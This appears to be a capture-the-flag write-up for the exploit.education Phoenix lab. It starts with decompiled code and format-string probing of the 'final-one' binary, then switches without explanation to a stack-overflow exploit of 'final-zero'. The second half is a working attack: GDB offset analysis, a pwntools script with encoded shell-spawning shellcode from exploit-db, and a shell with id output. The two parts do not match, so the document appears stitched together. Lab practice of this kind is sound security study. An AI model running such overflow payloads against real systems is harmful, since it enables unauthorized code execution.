# &#35; final-1

#### &#42; pseudocode using ghidra
```bash

undefined4 main(int param_1,int param_2)

{
  int iVar1;
  undefined *puVar2;
  undefined auStack16 [4];
  undefined4 *local_c;
  
  local_c = &param_1;
  if (param_1 < 2) {
    output = fopen("/dev/null","w");
    puVar2 = auStack16;
    if (output == (FILE *)0x0) {
      puVar2 = &stack0xffffffe0;
      err();
    }
  }
  else {
    iVar1 = strcmp(*(char **)(param_2 + 4),"--test");
    puVar2 = auStack16;
    testing = (uint)(iVar1 == 0);
    output = stderr;
  }
  *(undefined4 *)(puVar2 + -4) = 0;
  *(undefined4 *)(puVar2 + -8) = 2;
  *(undefined4 *)(puVar2 + -0xc) = 0;
  *(undefined4 *)(puVar2 + -0x10) = stdout;
  *(undefined4 *)(puVar2 + -0x14) = 0x8048ac2;
  setvbuf(*(FILE **)(puVar2 + -0x10),*(char **)(puVar2 + -0xc),*(int *)(puVar2 + -8),
          *(size_t *)(puVar2 + -4));
  *(undefined4 *)(puVar2 + -4) = 0;
  *(undefined4 *)(puVar2 + -8) = 2;
  *(undefined4 *)(puVar2 + -0xc) = 0;
  *(FILE **)(puVar2 + -0x10) = stderr;
  *(undefined4 *)(puVar2 + -0x14) = 0x8048ad6;
  setvbuf(*(FILE **)(puVar2 + -0x10),*(char **)(puVar2 + -0xc),*(int *)(puVar2 + -8),
          *(size_t *)(puVar2 + -4));
  *(char **)(puVar2 + -0x10) =
       "Welcome to phoenix/final-one, brought to you by https://exploit.education";
  *(undefined4 *)(puVar2 + -0x14) = 0x8048ae6;
  puts(*(char **)(puVar2 + -0x10));
  *(undefined4 *)(puVar2 + -4) = 0x8048aee;
  getipport();
  *(undefined4 *)(puVar2 + -4) = 0x8048af3;
  parser();
  return 0;
}


void logit(undefined4 param_1)

{
  char local_80c [2056];
  
  snprintf(local_80c,0x800,"Login from %s as [%s] with password [%s]\n",hostname,username,param_1);
  fprintf(output,local_80c);
  return;
}


void trim(char *param_1)

{
  char *pcVar1;
  
  pcVar1 = strchr(param_1,L'\r');
  if (pcVar1 != (char *)0x0) {
    *pcVar1 = '\0';
  }
  pcVar1 = strchr(param_1,L'\n');
  if (pcVar1 != (char *)0x0) {
    *pcVar1 = '\0';
  }
  return;
}

void parser(void)

{
  int iVar1;
  char *pcVar2;
  char local_8c [6];
  undefined auStack134 [3];
  char acStack131 [127];
  
  printf("[final1] $ ");
  while( true ) {
    pcVar2 = fgets(local_8c,127,stdin);
    if (pcVar2 == (char *)0x0) break;
    trim(local_8c);
    iVar1 = strncmp(local_8c,"username ",9);
    if (iVar1 == 0) {
      strcpy(username,acStack131);
    }
    else {
      iVar1 = strncmp(local_8c,"login ",6);
      if (iVar1 == 0) {
        if (username[0] == '\0') {
          puts("invalid protocol");
        }
        else {
          logit(auStack134);
          puts("login failed");
        }
      }
    }
    printf("[final1] $ ");
  }
  return;
}

```

#### &#42; check binary
```bash
$ file /opt/phoenix/i486/final-one
/opt/phoenix/i486/final-one: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/final-one
[*] '/opt/phoenix/i486/final-one'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
```bash
$ nc localhost 64004
Welcome to phoenix/final-one, brought to you by https://exploit.education
[final1] $ AAAAAAAAAAAAA
[final1] $ BBBBBBBBBBBBB
[final1] $ AAAA.%x.%x.%x.%x.%.x.%x.%x.%x.%x.%.x.%x.%x
[final1] $

```


==================================================================================================================================
==================================================================================================================================



#### &#42; vulnerable point
#### buffer overflow on gets()
```bash
#### we can overwrite ret using gets(local_214)
#### but we need to uppercase shellcode because local_214 is changed uppercase{toupper((int)local_214[local_10])}
```


#### &#42; stack structure
#### local_21[512] + dummy[16] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/final-zero -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/final-zero...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x080486e5 <+0>:	lea    ecx,[esp+0x4]
   0x080486e9 <+4>:	and    esp,0xfffffff0
   0x080486ec <+7>:	push   DWORD PTR [ecx-0x4]
   0x080486ef <+10>:	push   ebp
   0x080486f0 <+11>:	mov    ebp,esp
   0x080486f2 <+13>:	push   ecx
   0x080486f3 <+14>:	sub    esp,0x14
   0x080486f6 <+17>:	sub    esp,0xc
   0x080486f9 <+20>:	push   0x8048780
   0x080486fe <+25>:	call   0x80483f0 <puts@plt>
   0x08048703 <+30>:	add    esp,0x10
   0x08048706 <+33>:	mov    eax,ds:0x804998c
   0x0804870b <+38>:	sub    esp,0xc
   0x0804870e <+41>:	push   eax
   0x0804870f <+42>:	call   0x8048400 <fflush@plt>
   0x08048714 <+47>:	add    esp,0x10
   0x08048717 <+50>:	call   0x8048605 <get_username>
   0x0804871c <+55>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804871f <+58>:	sub    esp,0x8
   0x08048722 <+61>:	push   DWORD PTR [ebp-0xc]
   0x08048725 <+64>:	push   0x80487cb
   0x0804872a <+69>:	call   0x80483d0 <printf@plt>
   0x0804872f <+74>:	add    esp,0x10
   0x08048732 <+77>:	mov    eax,0x0
   0x08048737 <+82>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804873a <+85>:	leave
   0x0804873b <+86>:	lea    esp,[ecx-0x4]
   0x0804873e <+89>:	ret
End of assembler dump.
gef>


gef> disas get_username
Dump of assembler code for function get_username:
   0x08048605 <+0>:	push   ebp
   0x08048606 <+1>:	mov    ebp,esp
   0x08048608 <+3>:	sub    esp,0x218
   0x0804860e <+9>:	sub    esp,0x4
   0x08048611 <+12>:	push   0x200
   0x08048616 <+17>:	push   0x0
   0x08048618 <+19>:	lea    eax,[ebp-0x210]
   0x0804861e <+25>:	push   eax
   0x0804861f <+26>:	call   0x8048420 <memset@plt>
   0x08048624 <+31>:	add    esp,0x10
   0x08048627 <+34>:	sub    esp,0xc
   0x0804862a <+37>:	lea    eax,[ebp-0x210]
   0x08048630 <+43>:	push   eax
   0x08048631 <+44>:	call   0x80483e0 <gets@plt>
   0x08048636 <+49>:	add    esp,0x10
   0x08048639 <+52>:	sub    esp,0x8
   0x0804863c <+55>:	push   0xa
   0x0804863e <+57>:	lea    eax,[ebp-0x210]
   0x08048644 <+63>:	push   eax
   0x08048645 <+64>:	call   0x8048460 <strchr@plt>
   0x0804864a <+69>:	add    esp,0x10
   0x0804864d <+72>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048650 <+75>:	cmp    DWORD PTR [ebp-0x10],0x0
   0x08048654 <+79>:	je     0x804865c <get_username+87>
   0x08048656 <+81>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048659 <+84>:	mov    BYTE PTR [eax],0x0
   0x0804865c <+87>:	sub    esp,0x8
   0x0804865f <+90>:	push   0xd
   0x08048661 <+92>:	lea    eax,[ebp-0x210]
   0x08048667 <+98>:	push   eax
   0x08048668 <+99>:	call   0x8048460 <strchr@plt>
   0x0804866d <+104>:	add    esp,0x10
   0x08048670 <+107>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048673 <+110>:	cmp    DWORD PTR [ebp-0x10],0x0
   0x08048677 <+114>:	je     0x804867f <get_username+122>
   0x08048679 <+116>:	mov    eax,DWORD PTR [ebp-0x10]
   0x0804867c <+119>:	mov    BYTE PTR [eax],0x0
   0x0804867f <+122>:	mov    DWORD PTR [ebp-0xc],0x0
   0x08048686 <+129>:	jmp    0x80486b6 <get_username+177>
   0x08048688 <+131>:	lea    edx,[ebp-0x210]
   0x0804868e <+137>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048691 <+140>:	add    eax,edx
   0x08048693 <+142>:	mov    al,BYTE PTR [eax]
   0x08048695 <+144>:	movsx  eax,al
   0x08048698 <+147>:	sub    esp,0xc
   0x0804869b <+150>:	push   eax
   0x0804869c <+151>:	call   0x8048450 <toupper@plt>
   0x080486a1 <+156>:	add    esp,0x10
   0x080486a4 <+159>:	mov    dl,al
   0x080486a6 <+161>:	lea    ecx,[ebp-0x210]
   0x080486ac <+167>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486af <+170>:	add    eax,ecx
   0x080486b1 <+172>:	mov    BYTE PTR [eax],dl
   0x080486b3 <+174>:	inc    DWORD PTR [ebp-0xc]
   0x080486b6 <+177>:	sub    esp,0xc
   0x080486b9 <+180>:	lea    eax,[ebp-0x210]
   0x080486bf <+186>:	push   eax
   0x080486c0 <+187>:	call   0x8048440 <strlen@plt>
   0x080486c5 <+192>:	add    esp,0x10
   0x080486c8 <+195>:	mov    edx,eax
   0x080486ca <+197>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486cd <+200>:	cmp    edx,eax
   0x080486cf <+202>:	ja     0x8048688 <get_username+131>
   0x080486d1 <+204>:	sub    esp,0xc
   0x080486d4 <+207>:	lea    eax,[ebp-0x210]
   0x080486da <+213>:	push   eax
   0x080486db <+214>:	call   0x8048410 <strdup@plt>
   0x080486e0 <+219>:	add    esp,0x10
   0x080486e3 <+222>:	leave
   0x080486e4 <+223>:	ret
End of assembler dump.
gef>

gef> x/136xw $ebp-0x210
0xffffd4a8:	0x41414141	0x41414141	0x00004141	0x00000000
0xffffd4b8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4c8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4d8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4e8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4f8:	0x00000000	0x00000000	0x00000000	0x00000000
.
.
.
0xffffd678:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd688:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd698:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6a8:	0xffffd6d8	0x08048714	0xf7ffb1e0	0x00000000
0xffffd6b8:	0xffffd6d8	0x0804871c	0x00000000	0x00000000
gef>

gef> r < <(python -c 'print("A"*532+"BBBB")')
Starting program: /opt/phoenix/i486/final-zero < <(python -c 'print("A"*532+"BBBB")')
Welcome to phoenix/final-zero, brought to you by https://exploit.education

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x080499c0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0xf7ffb000  →  0x0008dedc
$ecx   : 0x0
$edx   : 0x0
$esp   : 0xffffd6c0  →  0x00000000
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xffffd764  →  0xffffd88a  →  "/opt/phoenix/i486/final-zero"
$edi   : 0x1
$eip   : 0x42424242 ("BBBB"?)
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────
0xffffd6c0│+0x0000: 0x00000000	 ← $esp
0xffffd6c4│+0x0004: 0x00000000
0xffffd6c8│+0x0008: 0x00000000
0xffffd6cc│+0x000c: 0x00000000
0xffffd6d0│+0x0010: 0x00000000
0xffffd6d4│+0x0014: 0xffffd6f0  →  0x00000001
0xffffd6d8│+0x0018: 0xffffd76c  →  0xffffd8a7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
0xffffd6dc│+0x001c: 0xf7f8f654  →  <__libc_start_main+53> mov DWORD PTR [esp], eax
───────────────────────────────────────────────────────────────────────────────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
───────────────────────────────────────────────────────────────────────────────
[#0] Id 1, Name: "final-zero", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────
───────────────────────────────────────────────────────────────────────────────
gef>


```

#### &#42; payload
#### shellcode : <https://www.exploit-db.com/exploits/13427 : https://www.exploit-db.com/exploits/13427/>
```bash
local_21[512] + dummy[16] + sfp[4] + ret[4]
payload  = b""
payload += b"\x90"*174
payload += shellcode
payload += b"\x90"*(532-len(payload))
payload += p32(0xffffd4d8)

```

#### &#42; exploit
```bash
$ cat exp_final0.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/final-zero"
conn = process(filename)
#conn = remote("localhost", 64003)

print( conn.recvline() )

shellcode  = b""
shellcode += b"\xeb\x02"
shellcode += b"\xeb\x05"
shellcode += b"\xe8\xf9\xff\xff\xff"
shellcode += b"\x5f"
shellcode += b"\x81\xef\xdf\xff\xff\xff"
shellcode += b"\x57"
shellcode += b"\x5e"
shellcode += b"\x29\xc9"
shellcode += b"\x80\xc1\xb8"
shellcode += b"\x8a\x07"
shellcode += b"\x2c\x41"
shellcode += b"\xc0\xe0\x04"
shellcode += b"\x47"
shellcode += b"\x02\x07"
shellcode += b"\x2c\x41"
shellcode += b"\x88\x06"
shellcode += b"\x46"
shellcode += b"\x47"
shellcode += b"\x49"
shellcode += b"\xe2\xed"
shellcode += b"DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB"
shellcode += b"AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA"
shellcode += b"JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO"
shellcode += b"BLAALMNIA"

payload  = b""
payload += b"\x90"*174
payload += shellcode
payload += b"\x90"*(532-len(payload))
payload += p32(0xffffd4d8)

with open("payload", "wb") as fd:
    fd.write(payload)

conn.sendline(payload)


conn.interactive()




$ python exp_final0.py
[+] Starting local process '/opt/phoenix/i486/final-zero': pid 4791
Welcome to phoenix/final-zero, brought to you by https://exploit.education

[*] Switching to interactive mode
$
$


$ nc localhost 5074
id
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)


```

